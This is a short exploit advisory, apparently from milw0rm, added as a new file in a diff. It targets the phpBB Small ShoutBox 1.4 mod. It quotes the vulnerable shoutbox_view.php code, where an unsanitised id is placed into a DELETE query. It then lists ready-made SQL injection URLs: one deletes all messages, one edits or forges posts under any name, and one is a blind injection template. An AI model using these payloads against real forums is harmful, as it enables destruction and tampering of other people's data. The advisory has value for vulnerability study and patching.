@@ -1,0 +1,39 @@
+/*
+    --------------------------------------------------------------
+    phpBB Mod Small ShoutBox 1.4 Remote Edit/Delete Messages Vuln
+    --------------------------------------------------------------
+    Discovered By StAkeR[at]hotmail[dot]it
+    Download On http://www.phpbbhacks.com/load.php?id=1595
+    NOTE:  Works Regardless PHP.ini Settings!
+    Thanks darkjoker
+    --------------------------------------------------------------
+    
+    File (shoutbox_view.php)
+    
+    
+    50. $id = ( isset($HTTP_GET_VARS['id']) ) ? $HTTP_GET_VARS['id'] : $HTTP_POST_VARS['id'];
+    
+    
+    
+    168. if ( $mode == "delete" && $adel )
+    169. {
+    170.   $sql = "DELETE FROM " . SHOUTBOX_TABLE . "
+    171.   WHERE id = $id $del_mod";
+    172. if( !($result = $db->sql_query($sql)) )
+    173. { message_die(GENERAL_ERROR, 'Could not delete shoutbox message', '', __LINE__, __FILE__, $sql); }
+    174.
+    
+    
+    - Delete All Messages
+    - shoutbox_view.php?mode=delete&id=-1 or 1=1/*
+    
+    - Edit Message / Post Message
+    - shoutbox_view.php?mode=edit&id=-1 or 1=1/*&name_id=1 or 1=1/*&date_edit=1225915829&name_edit=[NICKNAME]&clean_msg=[MESSAGE]
+    
+    
+    - Blind SQL Injection
+    - phpBB2/shoutbox_view.php?mode=delete&id=[Query]
+   
+*/   
+
+# milw0rm.com [2008-11-05]
